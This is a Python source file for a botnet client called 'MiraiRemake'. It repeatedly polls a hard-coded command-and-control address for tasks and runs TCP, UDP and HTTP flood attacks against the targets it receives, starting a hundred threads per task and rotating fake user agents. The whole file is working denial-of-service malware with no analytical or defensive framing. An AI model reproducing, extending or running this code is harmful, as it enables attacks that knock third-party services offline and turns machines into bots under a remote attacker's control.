import requests, uuid, time, json, threading, socket, os
from ssl import CERT_NONE, SSLContext, create_default_context
from certifi import where
import user_agent as user

ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE	

class MiraiRemake:

	def __init__(self, host):
		self.threadingPool    = {}
		self.host             = host
		self.threads          = [] 
		self.tasksPool        = {}
		self.methods = {"tcp":self.tcp_flood, "http":self.http_flood, "udp":self.udp_flood, "http-raw":self.http_raw_flood}

		self.start_botnet()
		for i in self.threads: i.join()

	def thread(self, function):
		try:
			threads = threading.Thread(target=function)
			self.threads.append(threads)
			threads.start()
			if function.__name__ == "GetCommand":
				time.sleep(2)
		except:
			pass


	def start_botnet(self):
		
		@self.thread
		def GetCommand():
			print("[INIT GET]")
			while True:
				try:
					time.sleep(2)
					response = requests.get(f"{self.host}/GetTask")
					if response.status_code == 200:
						self.tasksPool = response.json()
				except:
					pass

		@self.thread
		def SetCommand():
			print("[INIT SET]")
			while True:
				if len(self.tasksPool.keys()) != 0:
					for i in list(self.tasksPool.keys()):
						try: self.threadingPool[i]
						except: self.threadingPool[i] = self.tasksPool[i]

		@self.thread
		def DelCommand():
			print("[INIT DEL]")
			while True:
				if len(self.threadingPool.keys()) != 0:
					for i in list(self.threadingPool.keys()):
						try: self.tasksPool[i]
						except: self.threadingPool.pop(i)

		@self.thread
		def Do_Command():
			print("[INIT DO]")
			while True:
				if len(self.threadingPool.keys()) != 0:
					for i in list(self.threadingPool.keys()):
						try:
							if self.threadingPool[i]["status"] == "_":
								self.threadingPool[i]["status"] = "work"
								print(self.threadingPool[i]["target"])
								for x in range(100):
									target = self.threadingPool[i]["target"]
									threading.Thread(target=self.methods[self.threadingPool[i]["type"]], args=(target, i)).start()
						except: pass

	def tcp_flood(self, host, key):
		addr, port = host.split(":")[0], int(host.split(":")[1])
		while key in list(self.threadingPool.keys()):
			try:
				socket_c = socket.socket()
				socket_c.connect((addr, port))
				socket_c.send(os.urandom(32))
				socket_c.close()
			except: print("Error")

		print("Exit", host)


	def http_flood(self, host, key):
		while key in list(self.threadingPool.keys()):
			try:
				requests.get(host, headers = {"Host":host,"User-Agent":user.generate_user_agent(),"Accept": "*/*"})

			except: pass

	def http_raw_flood(self, host, key):
		print(host)
		while key in list(self.threadingPool.keys()):
			try:
				requests.get(host, headers = {"Host":host,"User-Agent":user.generate_user_agent(),"Accept": "*/*"})
				requests.post(host, headers = {"Host":host,"User-Agent":user.generate_user_agent(),"Accept": "*/*"})
				requests.head(host, headers = {"Host":host,"User-Agent":user.generate_user_agent(),"Accept": "*/*"})

			except Exception as er:
				print(er)
				exit(0)

	def udp_flood(self, host, key):
		addr, port = host.split(":")[0], int(host.split(":")[1])
		while key in list(self.threadingPool.keys()):
			try:
				socket_c = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
				socket_c.sendto(os.urandom(456), (addr, port))
			except: print("Error")

MiraiRemake("http://188.127.224.6:5000")



